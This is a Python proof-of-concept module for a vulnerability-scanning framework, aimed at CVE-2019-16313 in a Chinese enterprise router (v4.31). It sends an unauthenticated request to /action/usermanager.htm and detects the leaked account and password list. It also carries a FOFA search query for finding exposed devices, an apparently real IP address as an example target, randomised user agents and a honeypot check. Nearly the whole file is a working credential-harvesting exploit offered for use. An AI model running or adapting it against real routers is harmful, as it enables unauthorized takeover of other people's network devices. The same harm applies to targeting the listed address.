# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import re
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "2",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            v1 : 略  
            v2 : v1是字符串匹配，最然当时已经写得很严谨了，但仍有万分之一的几率会误报，改成了正则匹配可以解决
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "蜂网互联 企业级路由器v4.31 密码泄露漏洞",                        # 漏洞名称
        "VulnID" : "CVE-2019-16313",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "蜂网互联 企业级路由器",                     # 漏洞应用名称
        "AppVersion" : "v4.31",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            蜂网互联企业级路由器v4.31存在接口未授权访问，导致攻击者可以是通过此漏洞得到路由器账号密码接管路由器
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="蜂网互联-互联企业级路由器"
        """,                     # fofa搜索语句
        "example" : "http://222.134.86.166:8989",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/action/usermanager.htm" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False , allow_redirects=False)
            result = re.match("\{\"state\":1,\"rows\":\[\{\".+\}\]\}",req.text.strip())
            if result != None and req.status_code == 200:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()